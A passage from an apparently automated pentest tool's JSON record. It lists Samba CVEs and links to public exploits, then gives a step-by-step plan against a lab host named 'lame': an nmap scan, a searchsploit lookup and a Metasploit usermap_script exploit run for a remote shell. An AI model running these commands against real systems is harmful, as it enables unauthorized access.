                                "description": "smbd in Samba 3.0.6 through 3.0.23d allows remote authenticated users to cause a denial of service (memory and CPU exhaustion) by renaming a file in a way that prevents a request from being removed from the deferred open queue, which triggers an infinite loop.",
                                "weaknesses": [
                                    "NVD-CWE-Other"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-0452",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-0454",
                                "description": "Format string vulnerability in the afsacl.so VFS module in Samba 3.0.6 through 3.0.23d allows context-dependent attackers to execute arbitrary code via format string specifiers in a filename on an AFS file system, which is not properly handled during Windows ACL mapping.",
                                "weaknesses": [
                                    "CWE-134"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-0454",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-2446",
                                "description": "Multiple heap-based buffer overflows in the NDR parsing in smbd in Samba 3.0.0 through 3.0.25rc3 allow remote attackers to execute arbitrary code via crafted MS-RPC requests involving (1) DFSEnum (netdfs_io_dfs_EnumInfo_d), (2) RFNPCNEX (smb_io_notify_option_type_data), (3) LsarAddPrivilegesToAccount (lsa_io_privilege_set), (4) NetSetFileSecurity (sec_io_acl), or (5) LsarLookupSids/LsarLookupSids2 (lsa_io_trans_names).",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-2446",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-2447",
                                "description": "The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the \"username map script\" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.",
                                "weaknesses": [
                                    "NVD-CWE-Other"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-2447",
                                "exploit_info_links": [
                                    "https://github.com/MikeRega7/CVE-2007-2447-RCE",
                                    "https://github.com/mr-l0n3lly/CVE-2007-2447",
                                    "https://github.com/Nosferatuvjr/Samba-Usermap-exploit",
                                    "https://github.com/Aviksaikat/CVE-2007-2447",
                                    "https://github.com/0xTabun/CVE-2007-2447",
                                    "https://github.com/Juantos/cve-2007-2447",
                                    "https://github.com/bdunlap9/CVE-2007-2447_python",
                                    "https://github.com/HerculesRD/PyUsernameMapScriptRCE",
                                    "https://github.com/mmezirard/cve-2007-2447",
                                    "https://github.com/xbufu/CVE-2007-2447"
                                ]
                            },
                            {
                                "cve_id": "CVE-2007-4572",
                                "description": "Stack-based buffer overflow in nmbd in Samba 3.0.0 through 3.0.26a, when configured as a Primary or Backup Domain controller, allows remote attackers to have an unknown impact via crafted GETDC mailslot requests, related to handling of GETDC logon server requests.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-4572",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-5398",
                                "description": "Stack-based buffer overflow in the reply_netbios_packet function in nmbd/nmbd_packets.c in nmbd in Samba 3.0.0 through 3.0.26a, when operating as a WINS server, allows remote attackers to execute arbitrary code via crafted WINS Name Registration requests followed by a WINS Name Query request.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-5398",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2007-6015",
                                "description": "Stack-based buffer overflow in the send_mailslot function in nmbd in Samba 3.0.0 through 3.0.27a, when the \"domain logons\" option is enabled, allows remote attackers to execute arbitrary code via a GETDC mailslot request composed of a long GETDC string following an offset username in a SAMLOGON logon request.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2007-6015",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2008-1105",
                                "description": "Heap-based buffer overflow in the receive_smb_raw function in util/sock.c in Samba 3.0.0 through 3.0.29 allows remote attackers to execute arbitrary code via a crafted SMB response.",
                                "weaknesses": [
                                    "CWE-119"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2008-1105",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2009-2813",
                                "description": "Samba 3.4 before 3.4.2, 3.3 before 3.3.8, 3.2 before 3.2.15, and 3.0.12 through 3.0.36, as used in the SMB subsystem in Apple Mac OS X 10.5.8 when Windows File Sharing is enabled, Fedora 11, and other operating systems, does not properly handle errors in resolving pathnames, which allows remote authenticated users to bypass intended sharing restrictions, and read, create, or modify files, in certain circumstances involving user accounts that lack home directories.",
                                "weaknesses": [
                                    "CWE-264"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2009-2813",
                                "exploit_info_links": []
                            }
                        ]
                    }
                ],
                "references": [],
                "exploitdb": {
                    "title": "Samba 3.0.20 &lt; 3.0.25rc3 - &#039;Username&#039; map script&#039; Command Execution (Metasploit)"
                }
            },
            "steps": [
                {
                    "step_name": "Enumerate Samba version",
                    "tool_name": "nmap",
                    "description": "Use nmap to confirm the Samba version running on the target machine.",
                    "command": "nmap -p 445 --script smb-protocols 10.10.10.3",
                    "command_description": "This command will use nmap to scan for the Samba version running on the target machine by performing a script scan using the smb-protocols script on port 445.",
                    "output": "Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-01 22:37 BST\nNmap scan report for 10.10.10.3\nHost is up (0.072s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\nHost script results:\n| smb-protocols: \n|   dialects: \n|_    NT LM 0.12 (SMBv1) [dangerous, but default]\n\nNmap done: 1 IP address (1 host up) scanned in 2.51 seconds"
                },
                {
                    "step_name": "Search for Samba RCE exploit",
                    "tool_name": "searchsploit",
                    "description": "Search for a remote code execution (RCE) exploit for the identified Samba version using the searchsploit tool.",
                    "command": "searchsploit -x 'Samba 3.0.20' | grep 'remote'",
                    "command_description": "Search for a remote code execution (RCE) exploit for Samba version 3.0.20 using searchsploit",
                    "output": "------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                     |  Path\n------------------------------------------------------------------------------------------------------------------- ---------------------------------\nSamba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                             | multiple/remote/10095.txt\nSamba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                   | unix/remote/16320.rb\nSamba < 3.0.20 - Remote Heap Overflow                                                                              | linux/remote/7701.txt\nSamba < 3.6.2 (x86) - Denial of Service (PoC)                                                                      | linux_x86/dos/36741.py\n------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n"
                },
                {
                    "step_name": "Select and prepare the exploit",
                    "tool_name": "Metasploit",
                    "description": "Use Metasploit to select and prepare the exploit module for the identified Samba vulnerability.",
                    "command": "msfconsole -qx \"search samba; exit;\"",
                    "command_description": "Use this command to find the corresponding module that would potentially exploit the target service.",
                    "output": "Matching Modules\n================\n\n   #   Name                                                 Disclosure Date  Rank       Check  Description\n   -   ----                                                 ---------------  ----       -----  -----------\n   0   exploit/unix/webapp/citrix_access_gateway_exec       2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution\n   1   exploit/windows/license/calicclnt_getconfig          2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow\n   2   exploit/unix/misc/distcc_exec                        2002-02-01       excellent  Yes    DistCC Daemon Command Execution\n   3   exploit/windows/smb/group_policy_startup             2015-01-26       manual     No     Group Policy Script Execution From Shared Resource\n   4   post/linux/gather/enum_configs                                        normal     No     Linux Gather Configurations\n   5   auxiliary/scanner/rsync/modules_list                                  normal     No     List Rsync Modules\n   6   exploit/windows/fileformat/ms14_060_sandworm         2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution\n   7   exploit/unix/http/quest_kace_systems_management_rce  2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection\n   8   exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba \"username map script\" Command Execution\n   9   exploit/multi/samba/nttrans                          2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow\n   10  exploit/linux/samba/setinfopolicy_heap               2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow\n   11  auxiliary/admin/smb/samba_symlink_traversal                           normal     No     Samba Symlink Directory Traversal\n   12  auxiliary/scanner/smb/smb_uninit_cred                                 normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State\n   13  exploit/linux/samba/chain_reply                      2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)\n   14  exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load\n   15  auxiliary/dos/samba/lsa_addprivs_heap                                 normal     No     Samba lsa_io_privilege_set Heap Overflow\n   16  auxiliary/dos/samba/lsa_transnames_heap                               normal     No     Samba lsa_io_trans_names Heap Overflow\n   17  exploit/linux/samba/lsa_transnames_heap              2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow\n   18  exploit/osx/samba/lsa_transnames_heap                2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow\n   19  exploit/solaris/samba/lsa_transnames_heap            2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow\n   20  auxiliary/dos/samba/read_nttrans_ea_list                              normal     No     Samba read_nttrans_ea_list Integer Overflow\n   21  exploit/freebsd/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)\n   22  exploit/linux/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (Linux x86)\n   23  exploit/osx/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)\n   24  exploit/solaris/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)\n   25  exploit/windows/http/sambar6_search_results          2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow\n\n\nInteract with a module by name or index. For example info 25, use 25 or use exploit/windows/http/sambar6_search_results"
                },
                {
                    "step_name": "Run Metasploit Exploit",
                    "description": "Use the discovered Metasploit module to exploit the target service.",
                    "tool_name": "Metasploit",
                    "command": "msfconsole -qx \"use exploit/multi/samba/usermap_script; set RHOST 10.10.10.3; run;\"",
                    "command_description": "Use this command to run the specific exploit module against the target."
                },
                {
                    "step_name": "Set the required options",
                    "tool_name": "Metasploit",
                    "description": "Set the required options for the selected exploit module, including the target IP address."
                },
                {
                    "step_name": "Exploit the vulnerability",
                    "tool_name": "Metasploit",
                    "description": "Execute the exploit module to gain unauthorized access and obtain a remote shell on the target machine."
                }
            ]
        }
    ],
    "extra_details": {
        "hostname": "lame",
        "os_name": "Unix",
        "smb_version": "3.0.20-Debian",
        "workgroup": "WORKGROUP"
    },
    "can_resume_from_ui": true
}